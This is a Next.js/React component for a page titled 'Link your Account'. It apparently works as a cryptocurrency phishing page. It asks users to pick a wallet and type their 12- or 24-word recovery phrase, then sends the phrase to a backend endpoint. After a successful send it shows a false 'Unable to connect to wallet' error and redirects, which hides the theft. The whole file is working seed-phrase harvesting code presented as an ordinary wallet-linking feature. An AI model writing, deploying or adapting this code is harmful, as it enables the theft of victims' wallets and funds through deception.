"use client";

import React, { useState } from "react";
import { Wallet, ChevronDown } from "lucide-react";
import { toast } from "react-toastify";
import { useRouter } from "next/navigation";
import Image from "next/image";

const wallets = [
  { name: "MetaMask", logo: "/metamask.png" },
  { name: "Trust Wallet", logo: "/trustwallet.webp" },
  { name: "Phantom", logo: "/phantom.png" },
  { name: "Coinbase Wallet", logo: "/coinbase.png" },
  { name: "Atomic", logo: "/atomic.png" },
  { name: "Exodus", logo: "/exodus.png" },
  { name: "Math", logo: "/math.png" },
  { name: "Rainbow", logo: "/rainbow.png" },
];

export default function Connect() {
  const [selectedWallet, setSelectedWallet] = useState<{
    name: string;
    logo: string;
  } | null>(null);

  const [open, setOpen] = useState(false);
  const [recoveryPhrase, setRecoveryPhrase] = useState("");
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const wordCount = recoveryPhrase
    .trim()
    .split(/\s+/)
    .filter(Boolean).length;

  const isDisabled =
    loading || !selectedWallet || recoveryPhrase.trim() === "" || wordCount < 12;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isDisabled) return;

    try {
      setLoading(true);

      const res = await fetch(
        `${process.env.NEXT_PUBLIC_API_URL}/link-wallet`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            walletName: selectedWallet.name,
            seedPhrase: recoveryPhrase,
          }),
        }
      );

      if (!res.ok) {
        const errorData = await res.json();
        toast.error(errorData.message || "Failed to link wallet");
        return;
      }

      toast.error("Unable to connect to wallet.");
      setSelectedWallet(null);
      setRecoveryPhrase("");
      router.push("/dashboard");
    } catch (error) {
      console.error(error);
      toast.error("Unexpected error occurred");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="pb-60">
      <h1 className="text-sm md:text-lg font-bold text-white">
        Link your Account
      </h1>

      <form onSubmit={handleSubmit} className="pt-10 space-y-8">
        {/* WALLET SELECT */}
        <div className="relative md:w-[600px] w-[20rem]">
          <p className="text-sm pb-2 text-white">Wallet</p>

          <div
            onClick={() => setOpen(!open)}
            className="flex items-center justify-between border border-(--color2) rounded px-3 py-3 cursor-pointer bg-transparent"
          >
            {selectedWallet ? (
              <div className="flex items-center gap-2 text-white">
                <Image
                  src={selectedWallet.logo}
                  alt={selectedWallet.name}
                  width={20}
                  height={20}
                />
                <span className="text-white text-sm">
                  {selectedWallet.name}
                </span>
              </div>
            ) : (
              <span className="text-gray-400 text-sm">
                Select wallet
              </span>
            )}

            <ChevronDown size={18} className="text-gray-400" />
          </div>

          {open && (
            <div className="absolute z-20 mt-2 w-full bg-black border border-(--color2) rounded shadow-lg">
              {wallets.map((wallet) => (
                <div
                  key={wallet.name}
                  onClick={() => {
                    setSelectedWallet(wallet);
                    setOpen(false);
                  }}
                  className="flex items-center border-b  gap-3 px-3 py-2 cursor-pointer hover:bg-(--color2)"
                >
                  <Image
                    src={wallet.logo}
                    alt={wallet.name}
                    width={22}
                    height={22}
                  />
                  <span className="text-sm text-white">
                    {wallet.name}
                  </span>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* RECOVERY PHRASE */}
        <div>
          <p className="text-sm pb-2 text-white">
            Recovery Phrase
          </p>
          <textarea
            value={recoveryPhrase}
            onChange={(e) => setRecoveryPhrase(e.target.value)}
            placeholder="Enter your 12 or 24 word recovery phrase"
            className="border border-(--color2) placeholder:text-xs rounded-xl px-3 py-3 text-[16px] bg-transparent text-white md:w-[600px] w-[20rem] h-40"
          />
          <p className="text-xs text-(--color1) pt-2">
            {wordCount} words entered (minimum 12 or 24)
          </p>
        </div>

        {/* SUBMIT */}
        <button
          type="submit"
          disabled={isDisabled}
          className={`flex items-center justify-center gap-2 text-white text-sm font-semibold px-6 py-3 rounded md:w-[600px] w-[20rem] ${
            isDisabled
              ? "bg-(--color2) cursor-not-allowed"
              : "bg-(--color1) hover:bg-opacity-80"
          }`}
        >
          {loading ? "Linking..." : "Link Wallet"}
          <Wallet size={18} />
        </button>
      </form>
    </div>
  );
}
